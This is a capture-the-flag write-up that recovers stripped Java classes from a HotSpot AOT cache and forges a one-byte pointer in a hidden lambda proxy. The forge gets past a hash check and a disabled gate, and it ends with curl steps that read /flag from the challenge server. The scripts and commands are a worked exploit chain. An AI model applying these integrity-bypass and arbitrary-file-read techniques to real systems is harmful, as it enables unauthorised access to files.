+++
title = "Leftover Leftovers"
date = 2026-06-24
authors = ["Prasanna K S"]
+++

**Category:** Reverse Engineering and PWN
**Flag:** `GPNCTF{i_h0pE_7He_C4Ch3_Is_N3v3R_pR0vIDED_BY_11BR4RIE5}`

---

## 1. Overview

The handout supplied a jdk, a jar file, its cache.aot and a shell script to run the jar locally.

The given challenge is a 2 stage java app, and one important thing to note here is all of it's classes are stripped and the cache contains the information.

Stage 1 (`/cache` + `/init` on :1337) hands you the stage-2 AOT cache and will boot stage 2
**from a cache you upload** — *if* a SHA-256 over every named class's constant-pool + method
bytecode still matches the original. Stage 2 has a file-read gate (`/set-image-dir`) bricked by
a `s -> false` lambda. You can't patch that lambda's bytecode (it's hashed). But the lambda is
*invoked through a hidden proxy class*, and `verifyStuff` **never hashes hidden classes**. So you
flip **one pointer** in the proxy's constant pool to make it call the *neighbouring* lambda
(`s -> password != null`, returns true). Hash unchanged → upload accepted → gate open → read `/flag`.

```
GET /cache → forge 1 byte → verify hash locally → POST /init → stage2 boots
          → POST /set-image-dir (newPath="/") → PUT /products/flag → GET /images/flag → FLAG
```

---

## 2. Setup

What you need in the working dir (all from the handout except cfr):

| item | what it is |
|------|-----------|
| `my-jdk/` | the supplied **fastdebug OpenJDK 27** — the *only* JDK that boots these caches; ships the Serviceability Agent (`jdk.hotspot.agent`) |
| `cache.aot` (53 MB) | stage-2 AOT cache (the real app) |
| `outer-cache.aot` (38 MB) | stage-1 AOT cache (the upload server) |
| `leftovers2.jar` | app jar **with the `de.kitctf.*` classes stripped out** (they live only in the caches) |
| `exec.sh` | local launcher (reproduces the two-stage server) |
| `cfr-0.152.jar` | Java decompiler — `curl -O https://www.benf.org/other/cfr/cfr-0.152.jar` |

```bash
mkdir -p dumptool/cp dumptool/classes forge/out exploit
```

---

## 3. Recover the stripped classes from the cache  *(the enabling trick)*

The cache stores HotSpot's *internal, rewritten* class metadata — **no `.class` files, no
`cafebabe`**. To read code we make a JVM load the classes from the cache, then use the
**Serviceability Agent (SA)** tool `ClassDump` to reconstitute real `.class` files, then decompile.

`Loader.java` (create at repo root):
```java
import java.lang.foreign.*; import java.lang.invoke.MethodHandle;
public class Loader {
  static final int PR_SET_PTRACER = 0x59616d61;
  public static void main(String[] a) throws Throwable {
    Linker l = Linker.nativeLinker();
    MethodHandle prctl = l.downcallHandle(l.defaultLookup().find("prctl").orElseThrow(),
      FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.JAVA_INT,
        ValueLayout.JAVA_LONG, ValueLayout.JAVA_LONG, ValueLayout.JAVA_LONG, ValueLayout.JAVA_LONG));
    prctl.invoke(PR_SET_PTRACER, -1L, 0L, 0L, 0L);            // "anyone may ptrace me"
    for (String c : new String[]{
        "de.kitctf.gpn24.leftovers.Server","de.kitctf.gpn24.leftovers.State",
        "de.kitctf.gpn24.leftovers.Product","de.kitctf.gpn24.leftovers.ImageStore"})
      Class.forName(c);                                       // force-load from the cache
    System.out.println("PID="+ProcessHandle.current().pid());
    Thread.sleep(3600000);                                    // park so SA can attach
  }
}
```

Dump procedure:
```bash
my-jdk/bin/javac -d dumptool/cp Loader.java

# (a) boot a JVM that loads the inner classes from cache.aot, leave it parked
my-jdk/bin/java -XX:+UseG1GC -XX:+UseCompressedOops -Xmx3g \
    -XX:AOTCache=cache.aot -cp leftovers2.jar:dumptool/cp Loader &
PID=$!                                  # grab the PID it prints

# (b) SA reconstitutes every loaded klass into a real .class file (jdk.hotspot.agent = a module → -m)
my-jdk/bin/java -Dsun.jvm.hotspot.tools.jcore.outputDir=dumptool/classes \
    -m jdk.hotspot.agent/sun.jvm.hotspot.tools.jcore.ClassDump $PID

# (c) decompile
my-jdk/bin/java -jar cfr-0.152.jar dumptool/classes/de/kitctf/gpn24/leftovers/Server.class
```

For **stage 1**, repeat with `-XX:AOTCache=outer-cache.aot` and the `de.kitctf.gpn24.leftovers2.*`
class names (`OuterServer, AotCache, ArchiveReader, ConstantPoolView, InstanceKlassView,
MethodView, CompactHashtableReader, …`) → output into `dumptool/classes2`. These are the
challenge author's own cache-parser classes; you reuse them as a local hash oracle.

---

## 4. The bug, and why the obvious patch is rejected

Decompiled `Server` → `/set-image-dir`:
```java
context.bodyValidator(SetImageDir.class)
  .check(s -> s.password != null,                 "Password must be present")     // lambda$main$14
  .check(s -> false,                              "Password login is currently disabled") // lambda$main$15  <-- always false
  .check(s -> Files.exists(s.newPath) && Files.isDirectory(s.newPath), "Path must exist and be a directory")
  .get();
state.getImages().setFolderPath(setImageDir.newPath());      // set image dir to ANY existing dir
```
Combined with `PUT /products/{name}` + `GET /images/{name}` (returns `imagesDir/<name>`), if you
can set `imagesDir=/` and register a product `flag`, then `GET /images/flag` returns `/flag`.

The blocker is the middle check `s -> false` (= `lambda$main$15`). Its cache bytecode is
`03 b8 11 00 b0` (`iconst_0; invokestatic Boolean.valueOf; areturn` → **false**). The "obvious"
fix — flip `03`→`04` at `cache.aot:0x1f05a88` — **works locally but is rejected on upload**, because
stage 1's `OuterServer.verifyStuff` hashes every method's bytecode:

```java
for (InstanceKlassView k : aotCache.classIndex() sorted by name)   // NAMED classes only
  for (MethodView m : k.methods() sorted by address) {
     md.update(...codeSize, flags, maxLocals, maxStack...);
     md.update(m.constMethod().bytecode());                        // <-- bytecode IS hashed
     md.update(cp[nameIndex], cp[sigIndex]);
  }
```
Original total = `7aa5a496dde0fd1be5ef18ef2d5bf8acea749bf5647e31d34d4c0f0707bae5a3`; `/init` accepts
only if your upload hashes to exactly this. So: **change behaviour without touching anything hashed.**

---

## 5. The forge: redirect the hidden proxy (1 byte, hash-invariant)

`verifyStuff` iterates `classIndex()` = the **named system-dictionary classes**. But `s -> false`
isn't called directly — it's invoked through a **`LambdaMetafactory` hidden proxy**
(`Server$$Lambda+0x800000079`), and **hidden classes are not in the system dictionary**, so the
proxy's CP + bytecode are **never hashed**. The proxy's method is:
```
2b c0 00 0c  b8 01 00  b0    ; aload_1; checkcast; invokestatic <Server.lambda$main$15>; areturn
```
That `invokestatic` resolves at runtime through the **proxy's own constant pool**, against a
method-name `Symbol*`. Repoint that `Symbol*` from `lambda$main$15` (`return false`) to its
neighbour `lambda$main$14` (`return password != null`) and the gate now returns **true** for any
non-null password — with the hash byte-for-byte identical.

### 5a. Find the two symbol pointers and the proxy's CP slot (SA)

Re-park a loader, then run the two SA helpers (`forge/ProxyInspect.java`,
`forge/CpSym.java`) with the `dumptool/saflags.txt` flags. `CpSym` prints both symbol addresses
and the exact CP slot in the proxy that holds the `lambda$main$15` pointer:
```
symbol lambda$main$15=0x801467080  lambda$main$14=0x801467098     (adjacent, 0x18 apart)
proxy079 CP addr=... 
  CP+0x.. = lambda$main$15 symbol (0x801467080)  <-- PATCH THIS to 0x801467098
```

### 5b. Locate that slot's **file offset** by searching the cache

The value `0x801467080` appears **twice** in the file: once in the proxy's CP (free to edit) and
once in `Server`'s own CP at `0x1f009a0` (**hashed — do NOT touch**). So *search the file* and pick
the proxy occurrence — it is at **`0x293d9d8`**:
```bash
python3 - <<'PY'
import struct
d=open('cache.aot','rb').read()
hits=[i for i in range(len(d)-8) if struct.unpack_from('<q',d,i)[0]==0x801467080]
print([hex(h) for h in hits])     # -> ['0x1f009a0', '0x293d9d8']  (0x1f009a0=Server CP=hashed; 0x293d9d8=proxy=free)
PY
```

### 5c. Apply the 1-byte (8-byte pointer) edit

`forge_proxy.py`:
```python
import struct, sys
src = sys.argv[1] if len(sys.argv)>1 else 'exploit/remote_cache.aot'
dst = sys.argv[2] if len(sys.argv)>2 else 'exploit/remote_forged.aot'
data = bytearray(open(src,'rb').read())
off  = 0x293d9d8                                   # proxy CP method-name Symbol* (hidden class, unhashed)
cur  = struct.unpack_from('<q', data, off)[0]
assert cur == 0x801467080, f"unexpected {hex(cur)} at {hex(off)}"
struct.pack_into('<q', data, off, 0x801467098)     # -> lambda$main$14
open(dst,'wb').write(data)
print(f"forged {dst}: {hex(off)} {hex(cur)} -> 0x801467098")
```

> Only the **low byte** physically changes (`0x80→0x98`) because the symbols are adjacent; it's an
> 8-byte pointer write but a 1-byte diff. Confirm with `cmp -l src forged` → a single line.

---

## 6. Verify the forge locally **before** uploading

**(a) Hash must still equal `7aa5a496…`** — rebuild stage 1's `verifyStuff` from the dumped parser
classes (`forge/VerifyHarness.java`):
```bash
my-jdk/bin/javac -cp dumptool/classes2 -d forge/out forge/VerifyHarness.java
my-jdk/bin/java  -cp forge/out:dumptool/classes2 \
    de.kitctf.gpn24.leftovers2.VerifyHarness exploit/remote_forged.aot | tail -1
# TOTAL=7aa5a496dde0fd1be5ef18ef2d5bf8acea749bf5647e31d34d4c0f0707bae5a3   <-- must match
```
Live output (this run):
```
TOTAL=7aa5a496dde0fd1be5ef18ef2d5bf8acea749bf5647e31d34d4c0f0707bae5a3
```

**(b) Cache must still map** — boot the forged file with `Loader` + SA; no
`Unable to map shared spaces` (HotSpot doesn't CRC-check regions on load), and re-inspecting the
proxy now shows it pointing at `lambda$main$14`.

---

## 7. Performing the exploit live.

```bash
H=https://<YOUR-INSTANCE>.gpn24.ctf.kitctf.de

curl -s -m 120 "$H/cache" -o exploit/remote_cache.aot
sha256sum cache.aot exploit/remote_cache.aot      # if equal -> reuse offset 0x293d9d8 as-is
```
Live: both files hashed `0e3e91a88b6cb60f07141ee71e92bb51e12a55a5a329a2218dec58d14f9a4256`
(**remote == handout**, so the offset transfers directly). *If they differ, redo §3–§5 against
`remote_cache.aot` to re-derive the offset.*

```bash
# 2) forge + verify
python3 forge_proxy.py exploit/remote_cache.aot exploit/remote_forged.aot
my-jdk/bin/java -cp forge/out:dumptool/classes2 \
    de.kitctf.gpn24.leftovers2.VerifyHarness exploit/remote_forged.aot | tail -1   # == 7aa5a496...

# 3) upload the forged cache. On success stage 1 System.exit(0)s -> the TCP connection drops
#    (curl exit 52 "empty reply" is EXPECTED and means SUCCESS), and exec.sh boots stage 2.
curl -s -m 180 -X POST "$H/init" -F 'cache.aot=@exploit/remote_forged.aot' \
     -w "\n[http %{http_code}, %{size_upload} up, %{time_total}s]\n"
#   -> [http 100, 53792994 bytes up, 9.39s]   then connection closed (exit 52)

# 4) wait for stage 2 (Fridge tracker on GET /)
for i in $(seq 1 40); do
  out=$(curl -s -m 8 "$H/"); echo "try $i: $out"
  echo "$out" | grep -qi Fridge && { echo ">>> STAGE 2 UP"; break; }; sleep 6
done
#   -> try 1: <h1>Fridge tracker</h1>   >>> STAGE 2 UP

# 5) the bricked gate is now open: point imagesDir at "/"
curl -s -m 15 -X POST "$H/set-image-dir" -H 'Content-Type: application/json' \
     -d '{"password":"x","newPath":"/"}' -w "\n[http %{http_code}]\n"
#   -> [http 200]              (was "Password login is currently disabled" before the forge)

# 6) register a product literally named "flag" (sanitizer keeps [A-Za-z0-9_-], so "flag" survives)
curl -s -m 15 -X PUT "$H/products/flag" -H 'Content-Type: application/json' \
     -d '{"name":"flag","quantity":1,"bestBefore":"2030-01-01T00:00:00","notAfter":"2030-01-01T00:00:00"}'
#   -> Added product :)

# 7) read imagesDir/flag == /flag
curl -s -m 15 "$H/images/flag"
#   -> GPNCTF{i_h0pE_7He_C4Ch3_Is_N3v3R_pR0vIDED_BY_11BR4RIE5}
```
